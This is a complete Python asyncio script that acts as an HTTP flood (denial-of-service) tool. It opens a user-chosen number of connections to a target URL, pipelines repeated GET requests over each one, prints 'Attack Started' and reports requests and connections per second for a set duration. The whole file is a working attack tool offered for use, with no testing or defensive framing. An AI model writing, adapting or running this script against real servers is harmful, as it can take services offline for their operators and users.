import asyncio
import sys
import urllib.parse

loop = asyncio.get_event_loop()
rps, cps = 0, 0

async def connection(event, payload, url, rpc):
    global cps, rps
    while 1:
        reader, writer = await asyncio.open_connection(url.hostname, url.port or 80)
        await event.wait()
        cps += 1
        for _ in range(rpc):
            writer.write(payload)
            await writer.drain()
            rps += 1

async def main():
    url = urllib.parse.urlsplit(sys.argv[1])
    event = asyncio.Event()
    event.clear()
    payload = (
        f"GET {url.path or '/'} HTTP/1.1\r\n"
        f"Host: {url.hostname}\r\n"
        f"\r\n"
    ).encode('latin-1')
    rpc = int(sys.argv[3])

    for _ in range(int(sys.argv[2])):
        loop.create_task(connection(event, payload, url, rpc))
        await asyncio.sleep(.0)

    event.set()
    print("Attack Started")

async def logger():
    global cps, rps

    timer = int(sys.argv[4])

    while timer > 0:
        timer -= 1
        await asyncio.sleep(1)
        print("PPS: %d CPS: %d" % (rps, cps))
        rps, cps = 0, 0

if len(sys.argv) != 5:
    exit("python3 %s <target> <conncetions> <rpc> <timer>" % sys.argv[0])

loop.create_task(main())
loop.create_task(logger())
loop.run_forever()